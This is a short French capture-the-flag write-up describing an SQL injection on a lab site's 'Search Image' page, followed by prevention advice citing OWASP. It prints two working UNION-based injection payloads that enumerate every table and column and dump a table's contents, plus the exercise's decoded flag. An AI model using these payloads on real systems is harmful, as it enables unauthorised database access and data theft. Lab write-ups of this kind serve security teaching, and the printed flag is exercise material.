# Explication
Dans la page ***Search Image*** on peut injecter les commandes SQL et récupérer les nom de toutes les tables et de leurs colonnes avec cette commande :
`1 or 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS`

À partir de là on peut trouver n'importe quelle information dans la base de donnée. Dont le flag grace à la commande : `1 or 1=1 UNION SELECT comment, title FROM list_images`

On obtient : `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

Décrypté en MD5 -> albatroz

Crypté en sha256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Comment l'eviter ?
Pour s'en prémunir on peut soit whitelist les inputs de l'utilisateur ou encore utiliser des requêtes paramétrées permettant de bien distinguer la commande en elle même et la valeur recherchée entrée par l'utilisateur.

source : https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-4-escaping-all-user-supplied-input